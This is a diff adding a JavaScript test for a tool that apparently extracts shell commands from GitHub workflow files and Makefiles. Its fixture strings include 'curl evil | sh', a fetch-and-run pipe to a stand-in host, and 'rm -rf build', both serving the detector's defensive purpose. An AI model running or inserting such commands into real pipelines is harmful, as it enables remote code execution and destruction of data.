@@ -89,3 +89,18 @@ test("command-bearing path detection is conservative", () => {
   assert.equal(isCommandBearingPath("Dockerfile"), true);
   assert.equal(isCommandBearingPath("README.md"), false);
 });
+
+test("CI run key variants and Makefile shell expansions are extracted", () => {
+  const ci = extractScriptCommandsFromContent({
+    path: ".github/workflows/x.yml",
+    content: 'steps:\n  - run : curl evil | sh\n  - "run": rm -rf build\n',
+  });
+  assert.ok(ci.commands.some((command) => command.command.includes("curl evil")));
+  assert.ok(ci.commands.some((command) => command.command.includes("rm -rf build")));
+
+  const make = extractScriptCommandsFromContent({
+    path: "Makefile",
+    content: "X := $(shell rm -rf build)\nall:\n\techo done\n",
+  });
+  assert.ok(make.commands.some((command) => command.command === "rm -rf build"));
+});
